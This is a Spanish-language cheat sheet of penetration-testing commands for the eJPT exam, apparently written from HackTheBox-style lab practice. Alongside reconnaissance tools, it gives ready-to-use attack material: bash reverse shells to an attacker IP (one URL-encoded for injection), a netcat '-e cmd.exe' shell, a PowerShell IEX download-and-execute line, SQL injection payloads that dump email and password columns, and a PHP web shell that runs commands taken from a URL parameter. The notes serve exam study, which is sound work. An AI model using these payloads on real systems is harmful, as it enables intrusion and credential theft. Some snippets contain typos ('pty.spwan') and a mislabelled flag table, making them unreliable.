# Herramientas que te pueden servir en el EJPT

## Tabla de Contenido


(1.)[Escaneo-de-enumeraicón]


### Escaneo de enumeración de recursos web (HTTP)

Realiza un escaneo de enumeración de recursos web (HTTP) en el puerto 80 del host alert.htb, usando Nmap, y guarda el resultado en un archivo llamado webScan.

```bash
nmap --script http-enum -p80 alert.htb -oN webScan
```
<br>

| Parte del comando    | Significado                                                                                                                                                       |
| -------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `nmap`               | Ejecuta Nmap, una herramienta para escaneo de red.                                                                                                                |
| `--script http-enum` | Usa el script NSE llamado `http-enum`, que intenta **descubrir directorios y archivos comunes** en servidores web (tipo `/admin`, `/login`, `/robots.txt`, etc.). |
| `-p80`               | Limita el escaneo al **puerto 80** (HTTP).                                                                                                                        |
| `alert.htb`          | Es el **objetivo**, probablemente una máquina en un entorno tipo HackTheBox.                                                                                      |
| `-oN webScan`        | Guarda la salida en **formato normal** (`-oN`) en un archivo llamado `webScan`.                                                                                   |

<br>
<br>


**📦 ¿Qué es http-enum?**

El script **http-enum** forma parte del motor de scripts de Nmap (NSE: Nmap Scripting Engine) y:

- Intenta detectar rutas sensibles o conocidas en servidores web.
- Se basa en una base de datos de rutas predefinidas.
- Puede ayudarte a encontrar puntos de entrada como:

```
/admin
/config
/phpmyadmin
/wordpress
/login
/test
```

📂 Resultado típico:
El archivo webScan podría contener algo como:

```
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /admin/             Possible admin folder
|   /robots.txt         Found robots.txt file
|   /wordpress/         WordPress install detected
|_  /login/             Login page
```



**✅ ¿Para qué te sirve esto?**
Ideal para:

- Reconocimiento en pentesting web.
- Enumerar rutas sin usar herramientas externas como gobuster o dirb.
- Saber qué recursos HTTP expone un servidor.


### WhatWeb

El comando utiliza **WhatWeb**, una herramienta de fingerprinting web, para detectar tecnologías utilizadas por un sitio web *(alert.htb en este caso)*.

```
whatweb http://alert.htb
```

**📦 ¿Qué detecta WhatWeb?**

WhatWeb analiza el sitio web y te dice cosas como:

- El servidor web (Apache, Nginx, IIS, etc.)
- El CMS (WordPress, Joomla, Drupal…)
- Bibliotecas JS (como jQuery, Bootstrap)
- Frameworks (Laravel, Express, etc.)
- Headers HTTP interesantes (cookies, X-Powered-By, etc.)
- Posibles tecnologías de seguimiento o seguridad (Google Analytics, reCAPTCHA, WAF, etc.)
- Versiones si están disponibles (como PHP/7.4.3)

**🧠 Ejemplo de salida:**

```bash

http://alert.htb [200 OK] Country[RESERVED][ZZ], IP[10.10.10.100], 
Apache[2.4.29], PHP[7.2.24], Ubuntu, 
X-Powered-By[PHP/7.2.24], 
Title[Login Page]

```


**📌 ¿Para qué sirve?**

- Para hacer reconocimiento web rápido.
- Descubrir vectores de ataque según versiones (ej: PHP desactualizado).
- Identificar la superficie tecnológica de un sitio antes de atacar.

### Payload Inicial XSS (Cross-Site Scripting)

Este es un payload básico de XSS (Cross-Site Scripting) que:

```js
<script>alert(0)</script>
```

- Inyecta una etiqueta `<script>` en una página web.
- Ejecuta el código JavaScript `alert(0)`, lo que muestra una ventana emergente (alert) con el número 0.

**🧠 ¿Por qué se usa alert(0) para probar XSS?**

Porque es una forma segura y visible de comprobar si la inyección de código JavaScript funciona.

**✅ Si aparece la alerta, significa que:**

- El navegador ejecutó tu código.
- La entrada no fue correctamente filtrada ni escapada.
- La página es potencialmente vulnerable a XSS.

**🚨 ¿Qué es XSS exactamente?**

XSS (Cross-Site Scripting) es una vulnerabilidad en aplicaciones web que permite a un atacante inyectar scripts maliciosos que se ejecutan en el navegador de otras personas.

**🔺 Un XSS exitoso puede permitir:**

Robar cookies o tokens de sesión.

- Redirigir a sitios maliciosos.
- Modificar el contenido de la página.
- Registrar pulsaciones del teclado (keylogger).
- Hacer ingeniería social desde el sitio real.



### Comando: python3 -m http.server 80
Este comando levanta un servidor web HTTP básico en el puerto 80 usando Python 3.

**📌 Qué hace:**

- Crea un servidor web que sirve archivos del directorio actual (donde ejecutaste el comando).
- Usa el módulo http.server incorporado en Python.
- Puedes acceder desde un navegador o con curl así:

```
http://<IP_DEL_HOST>:80/
``` 

🧠 **Ejemplo de uso:**

Estás en /home/user/Downloads y corres:


```python
python3 -m http.server 80
``` 

Entonces alguien desde otra máquina puede descargar archivos de esa carpeta desde:

```
http://tu-ip/
```

### Comando: nc -nlvp 6666

Este comando usa Netcat (nc) para escuchar conexiones entrantes en el puerto 6666.

**📌 Significado de las opciones:**

- n: no resuelve DNS.
- l: modo escucha.
- v: verbose (muestra más info).
- p 6666: puerto a escuchar.

**🧠 Ejemplo de uso:**

Sirve para cosas como:

- Esperar una reverse shell.
- Hacer transferencia de archivos.
- Chat simple por TCP.

### Searchsploit

**searchsploit** es una herramienta de línea de comandos que permite buscar exploits públicos conocidos en la base de datos de Exploit-DB, directamente desde tu terminal.

**🛠️ ¿Para qué sirve?**

Sirve para buscar vulnerabilidades ya documentadas que puedes usar durante un análisis de seguridad o prueba de penetración. Es muy útil para encontrar rápidamente exploits relacionados con software, sistemas operativos, servicios, etc.

**💻 Comando básico:**

```bash
searchsploit nombre_del_software
``` 

Ejemplo: 

```bash
searchsploit enum ssh 7
``` 


### Fuzzear directorios (modo dir)

Busca directorios y archivos ocultos en un sitio web.

```bash
gobuster dir -u http://example.com -w /ruta/a/wordlist.txt
``` 

**🔧 Opciones comunes:**

- -u → URL del objetivo
- -w → Wordlist (por ejemplo, /usr/share/wordlists/dirb/common.txt)
- -x → Para buscar extensiones: .php,.html,.txt

**📌 Ejemplo completo:**

```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,txt
``` 

### Hashcat

**hashcat** es una herramienta potente para crackear hashes de contraseñas. Usa diccionarios, fuerza bruta, combinaciones y más. Es muy usada en CTFs, pentesting y recuperación de contraseñas.


**✅ Comando que usaste:**

```bash
hashcat hash /usr/share/wordlists/rockyou.txt --username
``` 

**🔍 ¿Qué hace?**

- hash → archivo con hashes (y posiblemente usuarios, en formato usuario:hash)

- /usr/share/wordlists/rockyou.txt → diccionario de contraseñas que probará

- --username → le dice a hashcat que el archivo tiene formato usuario:hash, y que debe considerar solo el hash

**🧪 ¿Qué hace internamente?**

- Lee cada línea del archivo hash
- Extrae el hash, ignorando el nombre de usuario
- Prueba contraseñas desde rockyou.txt
- Si encuentra coincidencia, lo muestra y puede guardarlo con el usuario original

### Como Matar un Proceso 

**✅ 1. Ver los procesos en ejecución**

Para listar todos los procesos:

```bash
ps aux
```

O para buscar uno específico (por nombre):

```bash
ps aux | grep nombre_del_proceso
```

**✅ 2. Matar un proceso con kill (por PID)**

Primero identifica el PID (Process ID), luego:

```bash
kill PID
``` 


### ¿Qué es el tunneling SSH?

Permite redirigir un puerto desde tu máquina local hacia un puerto de un servidor remoto (incluso uno que esté protegido o no expuesto públicamente). Sirve para acceder a servicios internos como webapps, bases de datos, paneles admin, etc.

🧭 Pasos para hacer TUNELING correctamente

**✅ 1. Verificar qué puertos están abiertos en la máquina remota**

Si tienes acceso SSH, puedes usar:

```bash
ss -nlpt
``` 

O también:

```bash
netstat -tulnp
``` 

Esto te muestra servicios internos corriendo como:


```bash
127.0.0.1:3306   (MySQL)
127.0.0.1:8000   (Panel web local)
``` 

**✅ 2. Crear el túnel con ssh -L**

La sintaxis básica es:

```bash
ssh -L [PUERTO_LOCAL]:[IP_OBJETIVO]:[PUERTO_OBJETIVO] usuario@IP_REMOTA
``` 


**📌 Ejemplo 1:** Acceder a una web oculta en localhost:8000 del servidor remoto
Editar

```bash
ssh -L 8888:127.0.0.1:8000 user@10.10.10.10
``` 

🔁 Esto significa:

Abre localhost:8888 en tu máquina, y se redirige a localhost:8000 del servidor remoto.

Ahora en tu navegador:


```
http://localhost:8888
``` 

Y verás lo que hay en 127.0.0.1:8000 del servidor remoto.

### Comandos en Consola con PHP

**✅ 1. system()**

Ejecuta un comando y muestra directamente la salida.


```php
<?php
system("ls -la");
?>
``` 

### Reverse Shell

**🎯 Objetivo:**

Ejecutar un comando en la máquina víctima que se conecta a tu IP y puerto, dándote una shell remota.

**✅ Reverse Shell clásica en Bash**

```bash
bash -i >& /dev/tcp/10.10.14.6/4444 0>&1
``` 

**🔍 ¿Qué hace?**

- bash -i → lanza bash en modo interactivo
- *>& /dev/tcp/... → redirige la entrada/salida hacia un socket TCP*
- 0>&1 → une la entrada estándar con la salida

**✅ Alternativa usando bash -c**

Útil cuando solo puedes ejecutar un comando tipo string:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'
``` 

🔥 Muy útil si tienes una vulnerabilidad RCE o estás en una inyección.

⚠️ Versión con caracteres escapados (URL-encoded)
Cuando tienes que inyectar en una URL o campo web y los caracteres especiales (>, &, etc.) no se permiten directamente, puedes usar:

```bash
bash -c 'bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261'
``` 

**🧠 %26 = & en URL encoding**

📡 En tu máquina atacante (listener):
Antes de ejecutar la reverse shell, prepárate con:

```bash
nc -nlvp 443
``` 

#### Pasos para Tunear tu RevShell

```bash

# 1
script /dev/null -c bash

#2 
Ctrl + Z

#2.5
stty raw -echo; fg

#3
reset xterm


#4
export TERM=xterm
export SHELL=bash

#5 
stty size

#6
stty rows 45 columns 236

# EXTRA - Si no deja el comando de script
# Generate una bash con python o python3

python3 -c 'import pty; pty.spwan("/bin/bash")'


```


### Buscar Archivos con permiso SUID (4000)


```bash
find / -perm 4000 2>/dev/null
``` 

**🔍 ¿Qué hace?**

| Parte         | Significado                                          |
| ------------- | ---------------------------------------------------- |
| `find /`      | Busca recursivamente desde la raíz del sistema (`/`) |
| `-perm 4000`  | Busca archivos con el **bit SUID** activado          |
| `2>/dev/null` | Oculta errores como "Permission denied"              |


**🎯 ¿Qué es el SUID (4000)?**

SUID = Set User ID

Permite que el archivo (normalmente ejecutable) se ejecute con los permisos del propietario, normalmente root.

Muy útil en escaladas de privilegios 🧨

📌 Ejemplo de salida:

```bash
/usr/bin/passwd
/usr/bin/sudo
``` 

Estos archivos tienen el bit SUID porque necesitan ejecutarse con privilegios de root, aunque el usuario no sea root.


**🧪 Filtros adicionales:**

**🔸 1. Filtrar por grupo con -group:**

```bash
find / -perm -4000 -group scriptmanagement 2>/dev/null
``` 
🔎 Encuentra archivos con SUID cuyo grupo propietario sea scriptmanagement.

**🔸 2. Filtrar por propietario con -user:**

```bash
find / -perm -4000 -user root 2>/dev/null
``` 

🔎 Encuentra archivos SUID propiedad de root.

🔥 Combinando todo:

```bash
find / -type f -perm -4000 -user root -group root 2>/dev/null
``` 

- -type f → Solo archivos

- -perm -4000 → También válido (el guion - busca que el bit esté presente, aunque haya más permisos)


### Capabilities

``` bash
getcap -r / 2>/dev/null
``` 

**🔍 ¿Qué hace?**

- getcap → Lista las capabilidades especiales de archivos (como ejecutables)

- -r / → Busca recursivamente desde la raíz del sistema

- 2>/dev/null → Oculta errores (como permisos denegados)

**🎯 ¿Qué son las capabilities en Linux?**

Permiten a un binario ejecutar ciertas acciones sin ser SUID ni root completo.

Por ejemplo: permitir que python abra un raw socket sin ser root.


### Escaneo por UDP

**Comando:**

```
nmap -sU --top-ports 100 --open -T5 -vv -n <IP>
```

**¿Qué hace --top-ports 100?**

Escanea los 100 puertos UDP más comunes según estadísticas de uso, no los primeros 100 en orden numérico.

**Objetivo:**

Detectar servicios UDP populares como DNS (53), SNMP (161), NTP (123), etc., de forma rápida y eficiente.

### ¿Qué es el puerto UDP 161 y el protocolo SNMP?

**SNMP** significa **Simple Network Management Protocol** (Protocolo Simple de Administración de Red).

**✅ ¿Para qué sirve SNMP?**

SNMP se usa para monitorear y gestionar dispositivos de red, como:

- Routers
- Switches
- Firewalls
- Servidores
- Impresoras

Permite obtener información como:

- Uso de CPU, RAM, discos
- Estado de interfaces de red
- Logs y alertas del sistema
- Estadísticas de tráfico

**🛠️ ¿Qué es snmpwalk?**

**snmpwalk** es una herramienta de línea de comandos que interroga un dispositivo SNMP para obtener información en forma de árbol (tipo JSON, pero jerárquico).

Ejemplo de uso:

```bash
snmpwalk -v2c -c public 192.168.1.1
``` 

- -v2c: usa SNMP versión 2c
- -c public: "community string", como una contraseña (por defecto es "public")

- 192.168.1.1: IP del dispositivo a consultar

**📥 Esto devuelve decenas o cientos de variables del sistema, como:**


```bash
SNMPv2-MIB::sysName.0 = STRING: router-office
SNMPv2-MIB::sysUpTime.0 = Timeticks: (2311451) 6:25:14.51
...
``` 

## Curl Command

**1. ¿Qué comando muestra la cabecera HTTP de una página web?**

**curl -i:** este muestra la cabecera HTTP y el cuerpo de la respuesta.

Ejemplo:


```bash
curl -i https://example.com
``` 

**Si quieres ver solo la cabecera:**

```bash
curl -I https://example.com
``` 


*(La i minúscula muestra cabezera + contenido, la I mayúscula muestra solo cabecera)*


**2. ¿Qué hacen los flags -s y -x en curl?**

`-s` → Silent mode: desactiva la barra de progreso y mensajes de error.

Útil si estás haciendo scripts o quieres una salida limpia.

Ejemplo:

```bash
curl -s https://example.com
``` 

- `-x` → Se usa cuando quieres que curl pase por un proxy.
- `-X` → Define el método HTTP que quieres usar (por defecto curl usa GET).

Ejemplo:

```bash
# -x
curl -x http://127.0.0.1:8080 https://example.com

# -X
curl -X POST https://example.com
``` 


✅ Ejemplo completo:

```bash
curl -s -i -x http://127.0.0.1:8080 https://example.com
``` 

- `-s`: modo silencioso

- `-i`: muestra cabeceras + contenido

- `-x`: pasa por proxy


###  Conectarte con la clave privada (id_rsa)

Desde otra terminal o tu máquina local, puedes hacer:

```bash
ssh -i /tmp/clave_rsa usuario@127.0.0.1
```

**🔐 ¿Por qué ocurre esto?**

Cuando usas `ssh -i id_rsa usuario@host`, SSH verifica los permisos del archivo de clave privada por razones de seguridad.

🔸 Si los permisos son muy abiertos (como 644 o 777), SSH muestra un error como este:


```bash
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
```

Y no te deja usar la clave, por lo tanto te pide contraseña como fallback.


**✅ ¿Cuál es el permiso correcto?**

```bash
chmod 600 id_rsa
```

Esto significa:

- Solo el propietario del archivo puede leer y escribir.

- Nadie más (ni grupo, ni otros) puede acceder.

### Comando básico para conectarse a MySQL

```bash
mysql -u usuario -p

# Comandos utilizados para navegar en mysql

-> DESC
-> SHOW
-> USE
```

Luego te pedirá la contraseña.

**Si el servidor MySQL está en otro host o en otro puerto:**

```bash
mysql -h IP_o_HOST -P PUERTO -u usuario -p
```

- `-h`: host remoto (por defecto localhost)

- `-P`: puerto (por defecto 3306)

- `-u`: usuario

- `-p`: te pedirá la contraseña


### Ver que tipo de hash tiene una password (Claro si esta hasheada XD)

```bash
hashcat --example-hash | grep '$2a$'

# PARAMETROS PARA UTILIZAR

-> -B : Arriba
-> -A : Abajo
-> -C : Arriba y abajo
```

### ¿Qué es IIS?

Es un programa que convierte una **computadora con Windows** en un **servidor web**, capaz de alojar y mostrar páginas o aplicaciones por Internet o Intranet.


### ¿Dónde se guardan los archivos subidos por FTP en un servidor Windows con IIS?

Depende de la configuración, pero por defecto:

**IIS (sitio web):**

Los archivos web públicos se guardan aquí:

```cmd
C:\inetpub\wwwroot\
```

Este es el root del sitio web, es decir, lo que ves en `http://victima.com/.`


### Para entablar la reverse shell en Windows con IIS:

Usé esta ruta para ejecutar Netcat desde la webshell:

```cmd
C:\inetpub\wwwroot\nc.exe -e cmd.exe 10.10.14.6 443
```

En mi Kali, escuché con:

```bash
rlwrap nc -nlvp 443
```

- rlwrap me dio una shell más estable e interactiva.

**Importante: Al subir nc.exe por FTP, primero puse el modo binario con:**

```bash
# En el FTP
binary
```

y luego:

```bash
put nc.exe
```

De lo contrario, el archivo se **corrompía** y no funcionaba.

```bash
# Comandos para interactuar en un entorno Windows

systeminfo

reg query "hklm\software\microsoft\windows nt\currentversion" /v ProductName


# More Information

whoami /groups

whoami /priv

netstat -nat

```


### ¿Qué es SMB?

**SMB** (Server Message Block) es un protocolo de red de Windows para compartir archivos, impresoras, y otros recursos entre dispositivos en una red local.

**🧠 En simple:**

SMB es cómo Windows accede a carpetas compartidas como \\servidor\carpeta.

**📘 Comando: Smb Client**


```bash
smbclient -L <IP> -N
```

**🔍 ¿Qué hace?**

- `-L <IP>`: Lista los recursos compartidos (shares) disponibles en la máquina con esa IP.

- `-N`: No pide contraseña (intenta conectarse como usuario anónimo).

**📘 Comando: Smb Map**

```bash
smbmap -H 10.10.11.106 -u 'null'

```

**🔍 ¿Qué hace?**

- `-L <IP>`: Lista los recursos compartidos (shares) disponibles en la máquina con esa IP.

- `-N`: No pide contraseña (intenta conectarse como usuario anónimo).

**🧠 ¿Para qué sirven?**

👉 Enumerar comparticiones SMB disponibles (shares) y ver qué permisos tienes como ese usuario.

### Puertos comunes en entornos Windows

| Puerto   | Protocolo | Servicio                          | ¿Para qué sirve?                                                 |
| -------- | --------- | --------------------------------- | ---------------------------------------------------------------- |
| **135**  | TCP       | **RPC (Remote Procedure Call)**   | Comunicación entre servicios remotos (inicio de DCOM, WMI, etc.) |
| **139**  | TCP       | **NetBIOS Session Service**       | SMB sobre NetBIOS (antiguo, usado en Windows viejos)             |
| **445**  | TCP       | **SMB (Server Message Block)**    | Compartición de archivos, impresoras, autenticación NTLM         |
| **3389** | TCP       | **RDP (Remote Desktop Protocol)** | Escritorio remoto                                                |
| **5985** | TCP       | **WinRM (HTTP)**                  | Administración remota con PowerShell (sin cifrado)               |
| **5986** | TCP       | **WinRM (HTTPS)**                 | Igual que 5985 pero cifrado (TLS)                                |
| **88**   | TCP/UDP   | **Kerberos**                      | Autenticación en Active Directory                                |
| **389**  | TCP/UDP   | **LDAP**                          | Directorio de usuarios y equipos                                 |
| **636**  | TCP       | **LDAPS**                         | LDAP cifrado con SSL/TLS                                         |
| **53**   | TCP/UDP   | **DNS**                           | Resolución de nombres                                            |
| **464**  | TCP/UDP   | **Kerberos (kpasswd)**            | Cambios de contraseña en AD                                      |

**🧠 ¿Por qué te importa esto como pentester?**

- 445 → Para ataques SMB (enumeración, credenciales, lateral movement).

- 135 + 445 → Uso combinado en ataques DCOM, WMI, o psexec.

- 5985/5986 → Si están abiertos y autenticables, puedes usar Evil-WinRM.

- 3389 → Ataques RDP (brute force, screen hijack si tienes creds).

- 389/636/88 → Clave para ataques a Active Directory.

## Impacket-smbserver

Levanta un servidor SMB falso en tu máquina para que otras máquinas (víctimas) se conecten.

**🧠 ¿Para qué sirve?**

- Robar hashes NTLMv2 (cuando alguien accede a \\tu-ip\share).

- Transferir archivos fácilmente desde/hacia máquinas Windows.

- Exploits que necesitan una ruta UNC (como \\IP\share\payload.dll).

**💻 Ejemplo de uso:**

```bash
smbserver.py share_name /ruta/al/directorio
# $(pwd)
```

Ejemplo real:

```bash
smbserver.py files $(pwd)
```

Luego en la víctima:

```bash
copy \\<tu-ip>\files\payload.exe .
```

**⚠️ Pentesting puro****

Es clave en escenarios como: captura de hashes, bypass de UAC, DLL hijacking, remote load, etc.



**🔹 1.**

```bash
nxc smb 10.10.11.106 -u 'tony' -p 'liltony'
```

**✅ ¿Qué hace?**

Usa nxc (alias de crackmapexec) para probar si las credeciales funcionan en el servicio SMB del host.

**🔍 ¿Para qué sirve?**

- Ver si el usuario tony tiene acceso SMB.
- Enumerar permisos.
- Ver si puedes moverte lateralmente.

**🔹 2.** 

```bash
nxc winrm 10.10.11.106 -u 'tony' -p 'liltony'
```

**✅ ¿Qué hace?**

Prueba si tony:liltony tiene acceso a WinRM (puerto 5985 o 5986) en ese host.

**🔍 ¿Para qué sirve?**

- Confirmar si puedes hacer ejecución remota de comandos vía PowerShell Remoting.
- Paso previo a usar Evil-WinRM.

**🔹 3.** 

```bash
evil-winrm -i 10.10.11.106 -u tony -p liltony
```

**✅ ¿Qué hace?**

Inicia una shell remota interactiva en PowerShell usando WinRM, si las credenciales son válidas.

**🔍 ¿Para qué sirve?**

- Tener acceso remoto completo tipo PowerShell a una máquina Windows.

- Ejecutar comandos, cargar archivos, post-explotación, etc.

**🔹 3.** 

```bash
evil-winr
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28/script.ps1')
```

**🧠 ¿Qué hace?**

- New-Object Net.WebClient: crea un cliente HTTP.

- .DownloadString(...): descarga el contenido del script remoto (texto).

IEX (Invoke-Expression): ejecuta el contenido del script descargado como código PowerShell.

💥 Efecto: Ejecuta un script remoto desde tu servidor (en 10.10.14.28), como si lo hubieras escrito a mano en la consola.

### SQLi

**🔹 1. Confirmar vulnerabilidad**

```sql
' OR 1=1-- 
' OR '1'='1'--
```

Sirve para verificar que el campo es vulnerable a inyección.

**🔹 2. Confirmar motor y usuario**

```sql
' UNION SELECT @@version, NULL--         -- (MySQL)
' UNION SELECT user(), NULL--            -- 
(Usuario actual)
```

Te ayuda a saber qué motor y usuario de base de datos estás usando.

**🔹 3. Identificar la base de datos actual**

```sql
' UNION SELECT database(), NULL--
```

Descubres en qué base de datos estás trabajando (por ejemplo: main).

**🔹 4. Listar todas las bases de datos (opcional)**

```sql
' UNION SELECT schema_name, NULL FROM 
information_schema.schemata--
```

Puedes ver si hay otras bases de datos que podrían ser útiles.

**🔹 5. Listar tablas de la base actual**

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='main'--
```

Descubres todas las tablas dentro de la base de datos actual (main).

**🔹 6. Listar columnas de una tabla específica**

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
```

Identificas qué columnas tiene la tabla objetivo (users).

**🔹 7. Extraer información de múltiples columnas (usando CONCAT)**

```sql
' UNION SELECT CONCAT(email, ':', password, ':', name) FROM users--
```

Extraes datos de varias columnas aun cuando solo se puede mostrar un campo.

**🔹 8. Paginar resultados si solo ves una fila**

```sql
' UNION SELECT CONCAT(email, ':', password) FROM users LIMIT 1 OFFSET 0--

' UNION SELECT CONCAT(email, ':', password) FROM users LIMIT 1 OFFSET 1--
```

Para ver registros uno por uno si el output está limitado.

### Contar caracteres de una hash

```bash
echo -n '098f6bcd4621d373cade4e832627b4f6' | wc -c
```

-  `-n` -> No toma los saltos de línea.


### SSTI - Server-Side Template Injection

**🔍 ¿Qué es?**

Una SSTI ocurre cuando una aplicación web inyecta directamente entradas del usuario en una plantilla del lado del servidor (server-side template) sin sanitizarla correctamente. Esto permite ejecutar código arbitrario dentro del motor de plantillas.

**🧪 Ejemplo típico de prueba:**

```html
{{7*7}}
```

- Si ves en la respuesta algo como 49, es vulnerable a SSTI.

- Es una forma común de testear motores como Jinja2 (usado en Python/Flask), Twig (PHP), etc.

**🔥 ¿Qué puede provocar?**

- Ejecución remota de código (RCE)
- Acceso a variables del sistema
- Lectura de archivos sensibles (/etc/passwd)
- Acceso a entorno (os, config, etc.)

**🧠 Motores vulnerables comunes**

| Lenguaje | Motor de plantilla              |
| -------- | ------------------------------- |
| Python   | Jinja2, Mako                    |
| Ruby     | ERB                             |
| Java     | FreeMarker, Velocity            |
| PHP      | Twig, Smarty                    |
| Node.js  | EJS, Handlebars (con variantes) |



### Recibir peticiones de Machines Victimas

**Con un ping**

```bash
sudo tcpdump -i eth0 icmp
```

```bash
ping <IP_de_tu_Kali>
```

**Con una petición por netcat**

```bash
# En Kali (escuchar)
nc -lvnp 4444
```

```bash
# En víctima (conectar)
nc <IP_KALI> 4444
```

### Buscas profundas

**1️⃣ Buscar dentro de contenido de archivos (recursivo)**

Si quieres buscar un patrón en todo el contenido de los archivos desde el directorio actual:

```bash
grep -i -r "patron" .
```

- `-i` → ignore case (mayúsc/minúsc no importa)
- `-r` → recursivo, entra en subdirectorios
- `"patron"` → lo que buscas (puede ser texto, parte de contraseña, etc.)
- `.` → directorio actual

**💡 Ejemplo:**

```bash
grep -i -r "password" .
```

Busca la palabra "password" en todos los archivos del directorio y subdirectorios.

**2️⃣ Buscar por nombre de archivo (sin leer el contenido)**

Aquí ya no usas grep sobre el contenido, sino sobre el listado de archivos con find + grep:

```bash
find . -type f | grep -i "nombre"
```

- `find . -type f` → lista todos los archivos
- `grep -i "nombre"` → filtra por nombre que contenga la palabra

**💡 Ejemplo:**

```bash
find . -type f | grep -i "config"
```

Muestra todos los archivos cuyo nombre contenga "config".

**3️⃣ Extra: buscar patrón solo en ciertos tipos de archivo**

```bash
grep -i --include="*.txt" -r "patron" .
```

Solo busca dentro de archivos .txt.

### Traer un archivo de la máquina remota a la local con nc

En tu máquina local (recibir el archivo)

**1. Abre un puerto para escuchar y guardar lo que llegue:**

```bash
nc -lvnp 4444 > archivo_recibido.txt
```

- Cambia 4444 por cualquier puerto libre y archivo_recibido.txt por el nombre que quieras.

**2. En la máquina remota (enviar el archivo)**

Ejecuta:

```bash
nc TU_IP_LOCAL 4444 < /ruta/del/archivo.txt
```

- TU_IP_LOCAL = la IP de tu máquina que escucha.
Deben estar en la misma red o con puertos abiertos.

**💡 Notas importantes:**

- nc no cifra nada → si es sensible, usa una VPN o túnel.
- En algunos sistemas el binario se llama ncat o netcat.
- Si hay firewalls, debes abrir el puerto elegido.
- El flujo es unidireccional: si quieres devolver algo, repites pero invirtiendo roles.

### Comando para traerse cosas a una CMD

Si en la máquina Linux víctima ya levantaste el servidor con:

```bash
python3 -m http.server 80
```

y el .exe está en ese directorio, desde la máquina Windows (con CMD) puedes traértelo con certutil (el comando que empieza con c que recuerdas 😁).

**Ejemplo:**

```bash
certutil -urlcache -f http://<IP_LINUX>/<archivo>.exe C:\Users\Public\<archivo>.exe
```

**🔹 Explicación:**

- `<IP_LINUX>` → la IP de la máquina donde levantaste el `http.server` (ej. `10.10.14.14`).
- `<archivo>.exe` → el nombre del ejecutable que quieres bajar.
- `C:\Users\Public\` → ruta donde lo guardarás en Windows.

### Escalada de Privilegios en Windows

1. 

![Logo de Kali](https://prnt.sc/rD-dujOAAWhf)

### Remote Code Execution (RCE) vía parámetros en PHP,

```php
<?php
if (isset($_GET['content'])) {
    $cmd = $_GET['content'];   // ← Toma lo que pongas en la URL
    system($cmd);              // ← Lo ejecuta en el sistema
}
?>
```

Si visitas:

```
http://servidor/exec.php?content=whoami
```

El script ejecutará whoami en el servidor y mostrará el resultado.